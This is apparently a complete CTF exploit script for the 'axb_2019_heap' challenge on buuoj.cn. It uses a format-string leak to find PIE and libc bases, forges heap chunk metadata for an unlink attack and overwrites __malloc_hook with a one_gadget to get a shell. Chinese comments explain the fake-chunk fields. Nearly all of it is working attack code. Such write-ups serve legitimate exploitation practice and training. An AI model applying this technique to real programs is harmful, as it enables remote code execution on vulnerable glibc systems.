# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './axb_2019_heap'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 1


if local == 1 :
    io = remote("node3.buuoj.cn","27850")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    io = ctx.start()


def add(inx,size,data):
    io.recvuntil('>> ')
    io.sendline('1')
    io.recvuntil('create (0-10):')
    io.sendline(str(inx))
    io.recvuntil('a size:')
    io.sendline(str(size))
    io.recvuntil('content: ')
    io.send(data)

def free(inx):
    io.recvuntil('>> ')
    io.sendline('2')
    io.recvuntil('index:')
    io.sendline(str(inx))

def edit(inx,data):
    io.recvuntil('>> ')
    io.sendline('4')
    io.recvuntil('index')
    io.sendline(str(inx))
    io.recvuntil('content: ')
    io.send(data)



io.recvuntil('your name: ')
io.sendline("%11$p%15$p")
io.recvuntil('Hello, ')
ret=io.recv(14)
text_base=int(ret[2:],16)-0x001186
libc_base=int(io.recvline()[2:],16)-0x20830
print(hex(text_base),hex(libc_base))

x=text_base+0x0202080#2
print "heap_address" + hex(x)
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0xf1147

add(0,0x88,'a\n')
add(1,0x88,'b\n')
add(2,0x88,'c\n')
add(3,0x88,'d\n')

# 对于heap_address的选取，要选取的是用于伪造的大chunk的fd保存的位置，根据index去找bss上面直接就是了

pl=p64(0)+p64(0x81)+p64(x-0x18)+p64(x-0x10)+'a'*0x60+p64(0x80)+p64(0x90)+'\n'
# 伪造的prve_size  0
# 伪造size，且inuse 为0，通常情况下写0x81，1表示前面一个chunk在使用中，防止再向前合并
# 填充
# 填入一个假的prev_size ，表示前面free掉的堆块的大小
# 要将堆块的 siez_inuse 置为0，便是前面存在一个free掉的堆块


edit(2,pl)
free(3)
# free 之后进行合并 堆块指针指向保存字节指针前0x18的位置

edit(2,p64(0x88)+p64(malloc_hook)+'aa\n') #1
edit(1,p64(one_gadget)+'\n')
io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('create (0-10):')
io.sendline(str(1))
io.recvuntil('a size:')
io.sendline(str(0x88))
io.interactive()

#  unlink 大法属实顶啊！！！
